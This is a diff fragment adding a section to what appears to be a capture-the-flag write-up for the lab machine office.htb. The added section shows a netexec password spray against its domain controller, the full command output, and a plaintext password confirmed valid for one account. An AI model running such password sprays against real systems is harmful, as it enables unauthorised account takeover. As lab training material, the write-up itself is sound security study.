@@ -297,3 +297,15 @@ None of the users are AS-REP roastable, but i could try a password spray since i
 
 # Password spray leads to user compromise
 
+```python
+nxc smb dc.office.htb -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
+SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:None)
+SMB         10.129.230.226  445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.129.230.226  445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.129.230.226  445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.129.230.226  445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+SMB         10.129.230.226  445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.129.230.226  445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+```
+Looks like ive compromised the user `dwolfe`
+
